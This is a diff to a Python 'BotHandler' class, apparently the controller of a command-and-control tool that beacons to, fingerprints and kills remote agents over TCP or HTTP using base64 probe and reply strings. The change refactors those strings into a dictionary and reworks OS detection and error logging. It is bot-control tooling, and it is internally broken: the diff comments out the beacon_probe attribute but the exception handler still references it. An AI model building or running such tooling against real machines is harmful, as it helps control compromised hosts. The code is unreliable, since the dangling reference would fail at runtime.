@@ -41,17 +41,27 @@ class Handler(threading.Thread):
                                                         # [0] = PING, [1] = BEACON
 
         # strings used for important communication
-        self.beacon_probe = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
-        self.beacon_reply = "reply code"
-        self.os_win_probe = "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt"
-        self.os_win_reply = ""
-        self.os_nix_probe = ""
-        self.os_nix_reply = ""
-        self.kill_probe = ""
-        self.kill_reply = ""
-        self.exit_probe = "c2xlZXBpbmc"
-        self.exit_reply = "c2xlZXBpbmc"
+        # self.beacon_probe = "beacon-probe"
+        # self.beacon_reply = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
 
+        self.os_probe = "operating-system-probe"
+        # self.os_win_reply = "d2luZG93cw"
+        # self.os_nix_reply = "bGludXgK"
+
+        # self.kill_probe = "kill"
+        # self.kill_reply = "ZGVhZA"
+
+        # self.exit_probe = "exit"
+        # self.exit_reply = "c2xlZXBpbmc"
+
+        # Dictionary to the above, better
+        self.reply_values = {
+            "beacon"    : "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy",
+            "windows"   : "d2luZG93cw",
+            "linux"     : "bGludXgK",
+            "kill"      : "ZGVhZA",
+            "exit"      : "c2xlZXBpbmc"
+        }
 
     # HTTP helper functions
     def api_get_request(self, endpoint):
@@ -78,9 +88,6 @@ class Handler(threading.Thread):
         # Grab operating system : Linux/Windows
         if(self.transport_type == "TCP"):
             self.setOS()
-            self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
-
 
         # Beacon indefinitely??
         self.beacon()
@@ -91,9 +98,9 @@ class Handler(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
 
         
-    def setStatus(self, index0, index1):
-        self.status[0] = index0
-        self.status[1] = index1
+    def setStatus(self, ping_status, beacon_status):
+        self.status[0] = ping_status
+        self.status[1] = beacon_status
 
     def stopBeacon(self):
         self.beacon_wait = True
@@ -102,7 +109,20 @@ class Handler(threading.Thread):
         self.beacon_wait = False
 
     def setOS(self):
-        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
+        os_code = self.execute(self.os_probe, True)
+        print(os_code)
+        if os_code == self.reply_values["windows"]:
+            self.os = "Windows"
+        elif os_code == self.reply_values["linux"]:
+            self.os = "Linux"
+        else:
+            self.os = "Error"
+            self.loggers[0].q_log('serv','error','[* BotHandler-Msg] Agent '+str(self.agent_id)+': unable to set operating system')
+            self.loggers[0].q_log('conn','error','[* BotHandler-Msg] Agent '+str(self.agent_id)+': unable to set operating system')
+
+        self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
+        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
+
         
     def getOS(self):
         return self.os
@@ -122,6 +142,9 @@ class Handler(threading.Thread):
     def getPort(self):
         return self.port
 
+    def getReply(self, probe):
+        return self.reply_values[probe]
+        
     def getTT(self):
         return self.transport_type
 
@@ -137,10 +160,12 @@ class Handler(threading.Thread):
 
         if self.transport_type == "TCP":
             return_val = self.execute("kill")
-            if "ZGVhZA" in return_val:
+
+            if self.reply_values["kill"] in return_val:
                 return_code = True
             else:
                 return_code = False
+                
         elif self.transport_type == "HTTP":
             return_val = self.execute(f'[{{"task_type":"configure","running":"false","dwell":"1.0","agent_id":"{str(agent.getID())}"}}]')
             print(return_val)
@@ -189,7 +214,7 @@ class Handler(threading.Thread):
                     try:
                         msg = self.execute("beacon", True)
                         
-                        if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
+                        if self.reply_values["beacon"] in msg:
                             self.status[1] = "UP"
                             self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : UP')
                         else:
@@ -371,14 +396,15 @@ class Handler(threading.Thread):
                 request_payload = json.loads(cmd_sent)
                 task_obj = self.api_post_request("/tasks", request_payload)
         except Exception as ex:
-            # Log this
-            print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.agent_id))
-            print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
+            # Log this - print to screen if not a beacon
+            if cmd_sent != self.beacon_probe:
+                print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
+                self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.agent_id))
+                print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
+                self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
             
             self.beacon_wait = False
-            return "== Return Value Error =="
+            return "Error"
         else:
             cmd_response = ""
             response = False
